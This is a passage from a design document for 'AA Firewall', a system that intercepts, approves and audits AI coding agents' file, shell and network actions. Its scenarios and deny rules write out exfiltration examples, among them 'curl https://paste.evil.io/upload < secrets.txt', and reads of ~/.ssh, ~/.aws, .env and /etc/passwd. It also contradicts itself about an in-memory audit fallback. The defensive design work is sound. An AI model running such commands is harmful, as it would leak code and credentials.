    H -- "deny" --> F
    H -- "timeout" --> I{Timeout policy}
    I -- "deny-on-timeout" --> F
    I -- "allow-on-timeout" --> E
    E --> J["Capture<br/>observed_effect<br/>= executed"]
    F --> K["observed_effect<br/>= blocked"]
    J --> L["Emit audit event"]
    K --> L
    L --> M["Validate minimum<br/>schema gate"]
    M --> N["Store in<br/>audit buffer"]
```

---

## 4A. Agentic AI Patterns and Agent Communication

### 4A.1 How AI Coding Agents Work

Understanding the agent execution model is essential for designing the interception layer. Modern AI coding agents follow a tool-use pattern:

```mermaid
flowchart LR
    U["Developer prompt"] --> LLM["LLM<br/>(Claude, GPT, etc.)"]
    LLM --> TC["Tool call decision<br/>(read file, run command,<br/>fetch URL, etc.)"]
    TC --> TE["Tool execution<br/>(OS-level action)"]
    TE --> TR["Tool result<br/>(output, error, etc.)"]
    TR --> LLM
    LLM --> R["Response to developer<br/>or next tool call"]
```

The critical insight: **the LLM does not directly act on the system.** It emits structured tool call requests, and a runtime executes them. AA Firewall's interception point is between the tool call decision and the tool execution — the moment where intent becomes action.

### 4A.2 Agent Communication Model

In a governed workflow, AA Firewall inserts itself into the agent's tool execution loop:

```mermaid
sequenceDiagram
    participant Dev as Developer
    participant LLM as Claude LLM
    participant RT as Claude Code Runtime
    participant Hook as AA Firewall Hook
    participant Daemon as AA Firewall Daemon
    participant Kernel as KernelEnforcer<br/>(eBPF / ESF)
    participant OS as Operating System

    Dev->>LLM: "Refactor the auth module"
    LLM->>RT: Tool call: Read("src/auth.ts")

    Note over RT,Daemon: Layer 1: IDE Hook Enforcement
    RT->>Hook: pre_tool_call: file.read src/auth.ts
    Hook->>Daemon: POST /v1/evaluate {file.read, src/auth.ts}
    Daemon->>Daemon: Evaluate policy (path inside project root)
    Daemon-->>Hook: {decision: allow, reason: PROJECT_PATH_ALLOWED}
    Hook-->>RT: Proceed

    Note over RT,OS: Layer 4: OS Kernel Enforcement
    RT->>OS: sys_enter_openat("src/auth.ts")
    OS->>Kernel: Syscall intercepted
    Kernel->>Kernel: Check: path inside workspace? → allow
    Kernel-->>OS: ALLOW
    OS-->>RT: File contents

    RT->>Hook: post_tool_call: file.read complete
    Hook->>Daemon: Enrichment event (correlation_id, observed_effect)
    RT-->>LLM: File contents

    LLM->>RT: Tool call: Write("src/auth.ts", new_content)
    RT->>Hook: pre_tool_call: file.write src/auth.ts
    Hook->>Daemon: POST /v1/evaluate {file.write, src/auth.ts}
    Daemon-->>Hook: {decision: allow}
    Hook-->>RT: Proceed
    RT->>OS: sys_enter_openat("src/auth.ts", O_WRONLY)
    OS->>Kernel: Syscall intercepted
    Kernel-->>OS: ALLOW (same workspace check)
    OS-->>RT: Write complete
    RT-->>LLM: Write complete
    LLM-->>Dev: "Refactored auth module"

    Note over Daemon,Kernel: Both layers logged audit events independently
```

### 4A.3 Multi-Agent and Delegation Patterns

Modern agent architectures often involve delegation. A primary agent may spawn sub-agents, call MCP tools, or route tasks to specialized workers:

```mermaid
flowchart TB
    PA["Primary Agent<br/>(Claude Code)"] --> SA1["Sub-Agent:<br/>Code Writer"]
    PA --> SA2["Sub-Agent:<br/>Test Runner"]
    PA --> MCP1["MCP Server:<br/>Database Tool"]
    PA --> MCP2["MCP Server:<br/>Search Tool"]
    SA1 --> FS["File System"]
    SA2 --> Shell["Shell<br/>(npm test)"]
    MCP1 --> DB["Database"]
    MCP2 --> Net["Network<br/>(API calls)"]

    style PA fill:#c0392b,stroke:#333,color:#fff
    style SA1 fill:#2471a3,stroke:#333,color:#fff
    style SA2 fill:#2471a3,stroke:#333,color:#fff
    style MCP1 fill:#b7950b,stroke:#333,color:#fff
    style MCP2 fill:#b7950b,stroke:#333,color:#fff
```

**Phase 1 scope:** AA Firewall governs the primary agent's direct actions (file, shell, network, package, credential, MCP). MCP tool governance is implemented via the MCP Gateway (`enforcement/mcpgateway.go`) with server registry and trust levels. Sub-agent delegation governance is Phase 2/3.

**Design implication:** The audit event schema includes `correlation_id` and `session_id` fields now so that when multi-agent governance is added in Phase 3, delegation chains can be reconstructed without schema migration.

### 4A.4 Trust Model for Agent Actions

AA Firewall treats the agent runtime as an untrusted actor regardless of whether the developer initiated it locally:

```mermaid
flowchart LR
    subgraph Untrusted["Untrusted Zone"]
        Agent["Agent Runtime"]
        RawTerm["Raw Terminal"]
        MCP["MCP Servers"]
        ExtAPI["External APIs"]
    end

    subgraph Governed["Governance Boundary (2 layers)"]
        subgraph AppLayer["Application Layer (IDE hooks)"]
            FSG["FS Guard"]
            SP["Shell Proxy"]
            NP["Network Proxy"]
        end
        subgraph KernelLayer["OS Kernel Layer (eBPF/ESF)"]
            KE["KernelEnforcer"]
            SG["Syscall Gate"]
        end
        Daemon["Local Daemon<br/>(privileged)"]
    end

    subgraph Trusted["Trusted Zone"]
        Policy["Policy Engine"]
        Audit["Audit Store<br/>(PostgreSQL)"]
        Approval["Approval Service"]
        Console["Sentinel Console"]
        ManagementHub["Management Hub<br/>(mTLS)"]
    end

    Agent --> FSG & SP & NP
    Agent --> SG
    RawTerm --> SG
    FSG & SP & NP --> Daemon
    KE --> Daemon
    SG --> KE
    Daemon --> Policy
    Daemon --> Audit
    Daemon --> Approval
    Audit --> Console
    Audit --> ManagementHub

    style KernelLayer fill:#0f3460,stroke:#e94560,color:#fff
```

The governance boundary has two layers. The **application layer** (IDE hooks) intercepts agent tool calls. The **kernel layer** (eBPF/ESF) intercepts OS-level syscalls — catching actions from both the agent and the raw terminal. Everything on the agent side is untrusted. Everything on the policy/audit/central side is trusted. The daemon sits at the boundary and mediates both layers.

---

## 4B. Security Enforcement Scenarios

These scenarios demonstrate exactly how AA Firewall enforces security in real agent workflows. Each scenario maps to a user story from PRD Appendix C.

### Scenario 1: File Write Outside Project Root — Blocked (US-1)

The agent attempts to write a configuration file to the developer's home directory.

```mermaid
sequenceDiagram
    participant CC as Claude Code
    participant FSG as Filesystem Guard
    participant D as Daemon
    participant VS as VS Code Extension

    CC->>FSG: Write("~/.bashrc", "alias ll='ls -la'")
    FSG->>D: POST /v1/evaluate<br/>{file.write, ~/.bashrc}
    D->>D: Match rule: org.block_non_project_writes<br/>Path ~/.bashrc is outside /Users/dev/project
    D-->>FSG: {decision: deny,<br/>reason_code: PATH_OUTSIDE_PROJECT_ROOT,<br/>reason: "Write outside project directory blocked"}
    FSG-->>CC: BLOCKED: Write to ~/.bashrc denied.<br/>Policy: org.block_non_project_writes
    D->>D: Emit audit event<br/>{attempted: file.write ~/.bashrc,<br/>observed_effect: blocked,<br/>decision: deny}
    VS->>VS: Status bar: "1 blocked"
```

**What the developer sees:** Claude Code reports the write was blocked with the specific policy rule and a human-readable explanation. The VS Code status bar updates to show the block count.

### Scenario 2: Destructive Shell Command — Approval Required (US-2)

The agent attempts to run `rm -rf node_modules && npm install`.

```mermaid
sequenceDiagram
    participant CC as Claude Code
    participant SP as Shell Proxy
    participant D as Daemon
    participant AR as Approval Router
    participant VS as VS Code Extension
    participant Rev as Security Reviewer

    CC->>SP: Exec("rm -rf node_modules && npm install")
    SP->>D: POST /v1/evaluate<br/>{shell.exec, "rm -rf node_modules && npm install"}
    D->>D: Match rule: org.approve_destructive_commands<br/>"rm -rf" matches destructive pattern
    D-->>SP: {decision: require_approval, approval_id: apr_001}
    SP-->>CC: exit 2 — BLOCKED (non-blocking)<br/>"Destructive command requires approval"
    D->>AR: Create PendingEntry keyed by approval_id

    Note over D,Rev: Sentinel client agent syncs to Hub every 3s
    AR->>Rev: Hub Console (port 9201) shows pending request:<br/>"rm -rf node_modules && npm install"<br/>Risk: destructive command pattern<br/>Policy: org.approve_destructive_commands

    alt Reviewer approves
        Rev->>AR: Click [Approve] on Hub Console<br/>Rationale: "Safe — rebuilding deps"
        AR->>D: Resolved decision piggybacks on next sync
        D->>D: Register single-use pre-approval scope
        Note over CC,D: Developer retries the command
        CC->>SP: Retry: Exec("rm -rf node_modules && npm install")
        SP->>D: POST /v1/evaluate
        D->>D: Scope match via ApprovalService.CheckScope()
        D-->>SP: {decision: allow, reason: SCOPE_APPROVED}
        SP->>SP: Execute command
        SP->>D: observed_effect: executed (exit 0)
    else Reviewer denies
        Rev->>AR: Click [Deny] on Hub Console<br/>Rationale: "Use npm ci instead"
        AR->>D: Denied
        Note over CC,D: Developer retries — no scope registered
        D-->>SP: {decision: require_approval} (no scope match)
        SP-->>CC: BLOCKED: Command denied by reviewer.<br/>Suggestion: "Use npm ci instead"
    else Timeout (5 minutes, no response)
        AR->>AR: Timeout reached (300s default)
        AR->>D: deny-on-timeout (TimeoutDeny behavior)
        D-->>SP: {decision: deny}
        SP-->>CC: BLOCKED: Approval timed out.<br/>Policy: deny-on-timeout for destructive commands
    end

    D->>D: Emit audit event with full approval chain
```

**What the developer sees:** Claude Code immediately reports the block (exit code 2). The developer is not frozen -- they can continue other work. The Sentinel client agent pushes the pending approval to the Hub Console within 3 seconds. An admin resolves via the Hub Console on port 9201. On approval, the developer retries the command and it is allowed via a single-use pre-approval scope.

### Scenario 3: Network Exfiltration Attempt — Blocked (US-1)

The agent attempts to POST source code to an external pastebin.

```mermaid
sequenceDiagram
    participant CC as Claude Code
    participant NP as Network Proxy
    participant D as Daemon

    CC->>NP: POST https://paste.unknown.io/api/upload<br/>Body: [source code]
    NP->>D: POST /v1/evaluate<br/>{network.request, host: paste.unknown.io}
    D->>D: Match rule: org.block_non_allowlisted_hosts<br/>paste.unknown.io not in allowlist
    D-->>NP: {decision: deny,<br/>reason_code: HOST_NOT_ALLOWLISTED}
    NP-->>CC: HTTP 403 Forbidden<br/>"Network request to paste.unknown.io blocked.<br/>Host is not on the organization allowlist."
    D->>D: Emit audit event<br/>{attempted: network.request paste.unknown.io,<br/>observed_effect: blocked,<br/>classification: [potential_exfiltration]}
```

**What the security reviewer sees later:** The audit console shows the blocked exfiltration attempt with the destination host, the policy that blocked it, and the classification tag. This is exactly the kind of evidence that satisfies a security review.

### Scenario 4: Safe Workflow — No Friction (US-1)

The agent performs routine development work. AA Firewall governs silently.

```mermaid
sequenceDiagram
    participant CC as Claude Code
    participant FSG as FS Guard
    participant SP as Shell Proxy
    participant D as Daemon

    CC->>FSG: Read("src/auth.ts")
    FSG->>D: evaluate {file.read, src/auth.ts}
    D-->>FSG: allow (PROJECT_PATH_ALLOWED)
    FSG-->>CC: File contents

    CC->>FSG: Write("src/auth.ts", refactored_code)
    FSG->>D: evaluate {file.write, src/auth.ts}
    D-->>FSG: allow (PROJECT_PATH_ALLOWED)
    FSG-->>CC: Write complete

    CC->>SP: Exec("npm test")
    SP->>D: evaluate {shell.exec, "npm test"}
    D-->>SP: allow (COMMAND_ALLOWED)
    SP-->>CC: Test output (exit 0)

    Note over D: All 3 actions logged silently.<br/>Developer saw zero interruption.
```

**What the developer experiences:** Nothing. The agent works normally. All actions were within policy. The audit trail captures everything, but the developer's flow was uninterrupted. This is essential — safe work must be fast.

### Scenario 5: Incident Investigation — Forensic Replay (US-3)

A security incident is reported. The reviewer reconstructs what happened.

```mermaid
sequenceDiagram
    participant Rev as Security Reviewer
    participant RC as Review Console
    participant AS as Audit Store

    Rev->>RC: Search: session_id = sess_abc123
    RC->>AS: Query events WHERE session_id = 'sess_abc123' ORDER BY timestamp
    AS-->>RC: 47 events

    RC->>Rev: Session Timeline:<br/>1. file.read src/auth.ts → allowed<br/>2. file.read .env → DENIED (sensitive path)<br/>3. shell.exec "curl api.internal.co" → allowed<br/>4. network.request api.internal.co/users → allowed<br/>5. shell.exec "curl https://paste.evil.io" → DENIED<br/>...<br/>47 events total, 3 denied, 1 approved

    Rev->>RC: Filter: decision = deny
    RC->>Rev: 3 denied actions:<br/>- .env read (SENSITIVE_PATH_READ_BLOCKED)<br/>- paste.evil.io POST (HOST_NOT_ALLOWLISTED)<br/>- /etc/passwd read (SENSITIVE_PATH_READ_BLOCKED)

    Rev->>RC: Export session as JSON evidence
    RC->>AS: Export session events
    AS-->>RC: JSON evidence package (47 events)
    RC-->>Rev: Download: sess_abc123_evidence.json
```

**What this demonstrates:** The audit trail is not raw log noise — it's a structured, filterable, exportable narrative that a security reviewer can follow from action to decision to outcome.

### Scenario 6: Policy Update and Rollback (US-4)

A platform operator updates a policy and discovers it's too restrictive.

```mermaid
sequenceDiagram
    participant PO as Platform Operator
    participant CPE as Central Policy Engine
    participant D as Local Daemon

    PO->>CPE: Upload new policy bundle v2026.04.27.1<br/>(tightened network allowlist)
    CPE->>CPE: Validate bundle, sign, store
    CPE->>D: Push updated bundle
    D->>D: Load v2026.04.27.1<br/>Store v2026.04.26.1 as rollback

    Note over D: New policy is active.<br/>Developers report legitimate API calls blocked.

    PO->>CPE: POST /v1/policy/rollback
    CPE->>D: Restore v2026.04.26.1
    D->>D: Revert to previous bundle

    Note over D: Previous policy restored.<br/>Legitimate API calls allowed again.

    D->>D: Emit audit event:<br/>{policy_change, from: v2026.04.27.1,<br/>to: v2026.04.26.1, actor: platform_operator,<br/>reason: "Overly restrictive network allowlist"}
```

### Scenario 7: Bypass Detection (Trust Metric)

The agent or developer executes an action outside the governed path.

```mermaid
sequenceDiagram
    participant Dev as Developer
    participant Term as Raw Terminal
    participant OS as Operating System
    participant BD as Bypass Detector
    participant D as Daemon

    Dev->>Term: curl https://paste.evil.io/upload < secrets.txt
    Term->>OS: Direct network call (bypasses proxy)
    OS-->>Term: Response

    BD->>BD: Detected: outbound connection to paste.evil.io<br/>not preceded by network proxy event
    BD->>D: ungoverned_execution alert<br/>{network.request, paste.evil.io, bypass_detected}
    D->>D: Emit audit event with alert flag<br/>{classification: bypass_attempt,<br/>severity: high}

    Note over D: Action was NOT blocked<br/>(already executed).<br/>But it IS visible in the audit trail<br/>and triggers an alert.
```

**Why this matters:** Bypass detection doesn't prevent the ungoverned action (it already happened), but it surfaces the gap. Security reviewers can see which actions bypassed governance, which informs both incident response and decisions about tightening enforcement (e.g., moving to container mode where bypass is harder).

---

## 5. Technology Stack

> **Note:** The core daemon, enforcement layer, policy engine, audit pipeline, approval service, anomaly detection, Management Hub, and Sentinel Agent have been ported from TypeScript to **Go**. The Sentinel Console remains in TypeScript (Next.js) but is compiled to static assets and embedded in the Go daemon binary via `go:embed`. This produces a single compiled binary with zero runtime dependencies.

### Core (Go — compiled binary)

| Layer | Choice | Rationale |
|---|---|---|
| **Daemon, policy engine, enforcement** | Go 1.26+ (`net/http`, `regexp`, `crypto/tls`) | Compiled binary — no source code on target, no runtime dependencies, no npm supply chain. Static linking via `CGO_ENABLED=0`. |
| **Hook handler** | Go (separate binary: `aafirewall-hook`) | ~5ms cold start (vs ~500ms for Node.js `npx tsx`). Reads stdin JSON, calls daemon `/v1/evaluate`, exits 0 (allow) or 2 (deny). |
| **Management Hub** | Go with `crypto/tls` (mTLS) | Native TLS support. Single binary for policy distribution + audit aggregation. |
| **Sentinel Agent** | Go (separate binary: `aafirewall-client`) | Registration, policy sync, audit forwarding, heartbeat. mTLS to Management Hub. |
| **In-process queue + PostgreSQL store** | `github.com/jackc/pgx/v5` (pure Go, no CGO) | PostgreSQL is the sole persistence layer. The in-process audit buffer is a queue only (not durable storage). |
| **PostgreSQL (central audit)** | `github.com/jackc/pgx/v5` (pure Go) | JSONB event store. Append-only. In-memory fallback when PostgreSQL unavailable. |
| **YAML parsing** | `gopkg.in/yaml.v3` | Policy bundle loading. |
| **UUID generation** | `github.com/google/uuid` | Event IDs, approval IDs, request IDs. |

### Console (TypeScript — dual builds embedded in Go binaries)

| Layer | Choice | Rationale |
|---|---|---|
| **Hub Console + Sentinel Console** | Next.js 15 + React + shadcn/ui + Tailwind CSS | Same codebase produces dual static builds (`out-hub` on port 9201, `out-sentinel` on port 9100). `isHubMode()` detection for separate navigation. Built to static HTML/JS/CSS, then embedded in Go binaries via `go:embed`. No Node.js needed at runtime. |
| **VS Code extension** | TypeScript (VS Code Extension API) | Phase 2. Required by VS Code. |

### Infrastructure

| Layer | Choice | Rationale |
|---|---|---|
| **Policy format** | Versioned YAML bundles | Human-readable, diffable, version-controllable. Parsed at load time. |
| **Container mode** | Docker (rootless) | Restricted mounts, read-only root filesystem, dropped capabilities, controlled egress. |
| **IPC (daemon ↔ enforcement points)** | Local HTTP (localhost) | Low latency, simple contract, no external dependencies. |

### Go Dependencies

| Dependency | Version | Purpose |
|---|---|---|
| `github.com/google/uuid` | v1.6 | UUID generation |
| `gopkg.in/yaml.v3` | v3.0 | YAML policy bundle parsing |
| `github.com/jackc/pgx/v5` | v5.9 | PostgreSQL driver — central audit store with TLS |

### Persistence Architecture

| Layer | Technology | Encryption | Purpose |
|---|---|---|---|
| **Audit store** | PostgreSQL 16 (JSONB) | TLS in transit (`sslmode=require`) + TDE/filesystem at rest | Append-only central audit store. No UPDATE/DELETE. Restricted `aafirewall` user (INSERT+SELECT only). |
| **In-process buffer** | Go in-memory queue | — | Decouples event emission from synchronous INSERT. Feeds PostgreSQL via flush service. |
| **No-persistence fallback** | `NoOpStore` | — | When PostgreSQL is unavailable, all audit operations return errors. No silent data loss — the daemon logs `CRITICAL: No audit persistence`. In strict mode, daemon refuses to start. |

> **PostgreSQL is the sole persistence layer. There is no in-memory fallback.** If PostgreSQL is unavailable, the `NoOpStore` rejects all audit operations with explicit errors rather than silently dropping data. In strict mode (`AA_STRICT_MODE=true`), the daemon refuses to start without PostgreSQL. The developer has no access to the database — credentials are stored in `/etc/aafirewall/.db_credentials` (root:600).

### Audit Trail Access Control

The developer has **NO access** to the audit database. The `setup-database.sh` script (run under `sudo` by the installer) enforces this at the PostgreSQL level:

| Actor | PostgreSQL Access | Grants |
|---|---|---|
| **`aafirewall` service user** | Can connect | INSERT + SELECT only. No UPDATE, DELETE, TRUNCATE, or CREATE. |
| **Developer's OS user** | Cannot connect | All grants revoked. `REVOKE ALL ON DATABASE aa_firewall FROM <developer>`. |
| **`postgres` superuser** | Full access | Reserved for admin maintenance (schema migrations, emergency recovery). |

**Database-level enforcement (not just application-level):**

```sql
-- Only the aafirewall service user can connect
REVOKE ALL ON DATABASE aa_firewall FROM PUBLIC;
GRANT CONNECT ON DATABASE aa_firewall TO aafirewall;

-- Append-only: INSERT + SELECT only, no UPDATE/DELETE/TRUNCATE
GRANT INSERT, SELECT ON audit_events TO aafirewall;
-- No UPDATE, DELETE, or TRUNCATE granted — enforced by PostgreSQL, not just the application

-- Developer's OS user explicitly denied
REVOKE ALL ON DATABASE aa_firewall FROM "<developer_username>";
```

**Credentials storage:**
- `DATABASE_URL` stored in `/etc/aafirewall/.db_credentials` (root:wheel, 600 permissions)
- Developer cannot read this file — no access to the connection string or password
- Daemon reads it at startup via the LaunchDaemon plist environment

**Defense-in-depth for audit trail:**

| Layer | Protection | What It Prevents |
|---|---|---|
| PostgreSQL grants | INSERT + SELECT only, no UPDATE/DELETE | Developer tampering via SQL |
| Database access revoke | Developer's OS user cannot connect | Developer cannot even query the database |
| Credentials file (root:600) | Developer cannot read DATABASE_URL | Developer cannot construct a connection string |
| SHA-256 hash chain | Each event includes previous event's hash | Tampering detected even if grants are bypassed |
| Management Hub aggregation | Events forwarded via mTLS | Evidence survives local destruction |
| Ed25519 signed exports | Cryptographic non-repudiation | Exported evidence is verifiable offline |

### Build Artifacts

| Binary | Size | Purpose |
|---|---|---|
| `aafirewall-daemon` | ~9 MB | Daemon + HTTP server + embedded console |
| `aafirewall-hook` | ~8.4 MB | Claude Code hook handler |
| `aafirewall-central` | ~8.7 MB | Management Hub mTLS server |
| `aafirewall-client` | ~8.5 MB | Sentinel Agent |

All binaries are **statically compiled** (`CGO_ENABLED=0`) with no runtime dependencies.

---

## 6. Interception Layer Design

### 6.1 Where Each Layer Sits

| Surface | Enforcement Point | Interception Mechanism | Pre-Execution? | Can Block? |
|---|---|---|---|---|
| **File system** | Filesystem Guard | Claude Code hooks API (`pre_tool_call` on Read/Edit/Write tools). For CLI mode: process wrapper that intercepts file operations before they reach the OS. | Yes | Yes |
| **Shell commands** | Shell Proxy | Claude Code hooks API (`pre_tool_call` on Bash tool). For CLI mode: wrapper executable inserted as shell delegate. Captures full command string, cwd, and environment before execution. | Yes | Yes |
| **Network egress** | Network Proxy | Local HTTP CONNECT proxy. Agent's outbound traffic routed through proxy via environment variable (`HTTP_PROXY`/`HTTPS_PROXY`). Proxy evaluates destination host against allowlist before forwarding. | Yes | Yes |
| **OS Kernel** | KernelEnforcer | eBPF programs on `sys_enter_openat`, `sys_enter_execve`, `sys_enter_connect` (Linux). Endpoint Security Framework event subscription (macOS). Intercepts all syscalls from all processes — catches raw terminal commands that bypass IDE hooks. | Yes | Yes |

### 6.2 Claude Code Integration (Phase 1)

Claude Code exposes a hooks system in its `settings.json` that fires on tool call events. AA Firewall registers hooks on the following events:

**Pre-tool-call hooks (blocking — can prevent execution):**

| Claude Code Tool | AA Firewall Enforcement Point | Policy Evaluated |
|---|---|---|
| `Read` | Filesystem Guard | Path read policy (sensitive path restrictions) |
| `Edit`, `Write` | Filesystem Guard | Path write policy (project-root boundary) |
| `Bash` | Shell Proxy | Command-pattern policy (destructive/exfiltrative patterns) |
| `WebFetch`, `WebSearch` | Network Proxy | Host allowlist policy |

**Post-tool-call hooks (non-blocking — for audit enrichment):**

| Claude Code Tool | AA Firewall Action | Purpose |
|---|---|---|
| All tools | Audit enrichment | Capture `observed_effect` (exit code, bytes written, response status) to pair with `attempted_action` in the audit event |

**CLI mode integration:**

When Claude Code runs as a CLI (`claude`), the same daemon and proxies are used. The process wrapper sets `HTTP_PROXY` for network interception. Shell commands are wrapped via a shim that routes through the shell proxy before executing. File operations are intercepted via the hooks API if available in CLI mode, or via a FUSE overlay in secure-container mode.

### 6.3 Bypass Detection

The daemon monitors for actions that reach the OS without passing through an enforcement point:

- File change watcher (inotify/FSEvents) detects writes not preceded by a filesystem guard event.
- Process monitor detects shell spawns not preceded by a shell proxy event.
- Network socket monitor detects outbound connections not routed through the network proxy.

Bypass events are logged as `ungoverned_execution` audit events with an alert flag. They do not block the action (the action already happened) but they surface visibility gaps for the security reviewer and inform readiness gate measurement.

---

## 7. Local Daemon Design

The daemon is the central coordination point on the developer's machine. All enforcement points communicate with it via a local API.

### 7.1 Responsibilities

1. **Receive action requests** from enforcement points (filesystem guard, shell proxy, network proxy, package guard, secret detector, MCP gateway) and from the OS kernel enforcer (eBPF/ESF syscall events).
2. **Evaluate policy** using the local policy cache (signed bundles with Ed25519 verification).
3. **Return decisions** synchronously: allow, deny, or require_approval. Enforce RBAC (admin/reviewer/operator).
4. **Route approvals** to the approval service when decision is require_approval.
5. **Buffer audit events** and flush to PostgreSQL (append-only, hash-chain integrity).
6. **Enforce fail mode** — strict mode denies all on error; default mode is fail-closed when policy cache is stale.
7. **Coordinate OS kernel enforcement** — push policy rules to KernelEnforcer, receive kernel audit events.
8. **Sync with Management Hub** via Sentinel Agent — policy distribution, audit forwarding, heartbeat.

### 7.2 Local Decision API

```
POST /v1/evaluate
```

Request:
```json
{
  "session_id": "sess_abc123",
  "actor": {
    "user_id": "dev_001",
    "agent_type": "claude_code",
    "agent_instance": "vscode_ext_1"
  },
  "action": {
    "type": "file.write",
    "attempted_action": "Write 247 bytes to /Users/dev/.config/settings.json"
  },
  "resource": {
    "kind": "file",
    "path": "/Users/dev/.config/settings.json"
  },
  "context": {
    "workspace": "/Users/dev/project",
    "repo": "acme/backend",
    "branch": "main",
    "environment_tier": "development"
  }
}
```

Response:
```json
{
  "decision": "deny",
  "reason_code": "PATH_OUTSIDE_PROJECT_ROOT",
  "reason_human": "Write to /Users/dev/.config/settings.json denied: path is outside the approved project root /Users/dev/project.",
  "policy_id": "org.block_non_project_writes",
  "policy_version": "v2026.04.26.1",
  "approval_required": false
}
```

### 7.3 Fail Mode

Configurable per deployment:

| Mode | Behavior | Use Case |
|---|---|---|
| **fail-closed** | Deny all actions if policy cache is unavailable or stale beyond TTL | High-risk enterprise environments, regulated teams |
| **fail-open** | Allow action with `decision: allow_degraded` and emit alert-level audit event | Early pilots, low-risk teams building confidence |

Default: fail-closed. Configurable in daemon settings.

---

## 8. Policy Model

### 8.1 Hierarchy

```
Organization baseline (non-negotiable)
  └─ Team policy (can tighten, never weaken)
       └─ Repository / workspace policy (can tighten, never weaken)
            └─ Developer-local guardrails (can tighten, never weaken)
```

### 8.2 Policy Object Schema

```yaml
policy_id: org.block_non_project_writes
version: v2026.04.26.1
scope:
  level: organization        # organization | team | repository | local
subject:
  agent_types: ["*"]
  users: ["*"]
action:
  types: [file.write, file.delete, file.move]
resource:
  path_outside_project: true  # matches when path is outside workspace root
conditions: {}
effect:
  decision: deny
  reason_code: PATH_OUTSIDE_PROJECT_ROOT
  reason_human: "Writes outside the project directory are blocked by organization policy."
logging:
  mode: full                  # full | metadata_only | redacted
approval:
  required: false
```

### 8.3 Evaluation Order

1. Load organization baseline rules.
2. Overlay team rules (can only add restrictions or escalate effects).
3. Overlay repository/workspace rules (same constraint).
4. Overlay developer-local rules (same constraint).
5. Evaluate rules in order: deny rules first, then require_approval rules, then allow rules, then default-deny (least privilege).
6. First matching rule wins within each priority band.
7. Every decision emits a reason code and records the policy version.

### 8.4 Default Policy Bundle (shipped with MVP)

The default policy bundle (`policies/default.yaml`, version `v2026.04.29.1`) ships **13 rules** across 4 tiers:

**Deny rules (6):**

| Rule ID | Action | Resource | Effect | Reason Code |
|---|---|---|---|---|
| `org.block_non_project_writes` | file.write, file.delete, file.move | Path outside project root | deny | `PATH_OUTSIDE_PROJECT_ROOT` |
| `org.block_shell_deletes_outside_project` | shell.exec | Shell delete commands targeting paths outside project root | deny | `SHELL_DELETE_OUTSIDE_PROJECT` |
| `org.block_shell_moves_outside_project` | shell.exec | Shell move/copy commands targeting paths outside project root | deny | `SHELL_MOVE_OUTSIDE_PROJECT` |
| `org.block_sensitive_reads` | file.read | Paths matching `~/.ssh/*`, `~/.aws/*`, `~/.config/gcloud/*` | deny | `SENSITIVE_PATH_READ_BLOCKED` |
| `org.block_non_allowlisted_hosts` | network.request | Host not in allowlist | deny | `HOST_NOT_ALLOWLISTED` |
| `org.deny_credential_access` | credential.access | Credential files and secret commands | deny | `CREDENTIAL_ACCESS_DENIED` |

**Require-approval rules (4):**

| Rule ID | Action | Resource | Effect | Reason Code |
|---|---|---|---|---|
| `org.approve_destructive_commands` | shell.exec | Command matching `rm -rf *`, `git push --force*`, `git reset --hard*` | require_approval | `DESTRUCTIVE_COMMAND_REQUIRES_APPROVAL` |
| `org.approve_unknown_network` | network.request | Host in warning list (known but not fully trusted) | require_approval | `NETWORK_HOST_REQUIRES_APPROVAL` |
| `org.approve_package_installs` | package.install | Package install commands (npm/pip/brew/yarn/cargo) | require_approval | `PACKAGE_INSTALL_REQUIRES_APPROVAL` |
| `org.mcp_require_approval_untrusted` | mcp.tool_call | MCP tool calls from untrusted servers | require_approval | `MCP_UNTRUSTED_TOOL_REQUIRES_APPROVAL` |

**Allow rules (3):**

| Rule ID | Action | Resource | Effect | Reason Code |
|---|---|---|---|---|
| `org.allow_internal_tools` | internal.orchestration | Internal orchestration tools (Agent, TodoWrite, Skill) | allow | `INTERNAL_TOOL_ALLOWED` |
| `org.allow_project_files` | file.read, file.write | Path inside project root | allow | `PROJECT_PATH_ALLOWED` |
| `org.allow_safe_commands` | shell.exec | Commands not matching any deny or approval pattern | allow | `COMMAND_ALLOWED` |

### 8.5 Policy Versioning and Rollback

- Every policy bundle has a version string (format: `vYYYY.MM.DD.N`).
- Every audit event records the policy version that produced the decision.
- The daemon stores the current and previous policy bundle.
- Rollback: load previous bundle via `POST /v1/policy/rollback`. Takes effect immediately without daemon restart.
- Policy changes are audited: who changed, when, from which version to which version.

---

## 9. Audit Log Schema

### 9.1 Event Schema

```json
{
  "event_id": "gen_random_uuid()",       // PostgreSQL gen_random_uuid() for event IDs
  "timestamp": "2026-04-26T16:00:00.000Z",
  "session_id": "sess_abc123",
  "correlation_id": "corr_parent_or_self",

  "actor": {
    "user_id": "dev_001",
    "agent_type": "claude_code",
    "agent_instance": "vscode_ext_1"
  },

  "environment": {
    "workspace": "/Users/dev/project",
    "repo": "acme/backend",
    "branch": "main",
    "tier": "development",
    "deployment_mode": "host"
  },

  "action": {
    "type": "shell.exec",
    "attempted_action": "rm -rf node_modules",
    "observed_effect": "blocked"
  },

  "resource": {
    "kind": "command",
    "value": "rm -rf node_modules",
    "path": "/Users/dev/project",
    "host": null,
    "mcp_server": null,
    "classification": ["destructive"]
  },

  "policy": {
    "policy_id": "org.approve_destructive_commands",
    "policy_version": "v2026.04.26.1",
    "decision": "require_approval",
    "reason_code": "DESTRUCTIVE_COMMAND_REQUIRES_APPROVAL",
    "reason_human": "Command matches destructive pattern. Approval required."
  },

  "approval": {
    "status": "denied",
    "approver_id": "sec_reviewer_01",
    "rationale": "Use npm ci instead of rm -rf + reinstall.",
    "requested_at": "2026-04-26T16:00:00.500Z",
    "resolved_at": "2026-04-26T16:00:15.200Z",
    "scope": null,
    "expiry": null
  },

  "payload_summary": {
    "redacted": false,
    "content_hash": null,
    "bytes": null
  }
}
```

### 9.2 Minimum Schema Validation Gate

Every event must pass this gate before acceptance into the audit store. If any field is missing, the event is rejected and an error is logged.

| Required Field | Maps To | Example |
|---|---|---|
| `who` | `actor.user_id` + `actor.agent_type` | "dev_001 via claude_code" |
| `what` | `action.type` + `action.attempted_action` | "shell.exec: rm -rf node_modules" |
| `when` | `timestamp` | "2026-04-26T16:00:00.000Z" |
| `policy` | `policy.policy_id` + `policy.policy_version` | "org.approve_destructive_commands v2026.04.26.1" |
| `decision` | `policy.decision` + `policy.reason_code` | "require_approval: DESTRUCTIVE_COMMAND_REQUIRES_APPROVAL" |
| `result` | `action.observed_effect` | "executed", "blocked", or "pending_approval" (not "pending") |

### 9.3 Storage

| Store | Technology | Purpose | Retention |
|---|---|---|---|
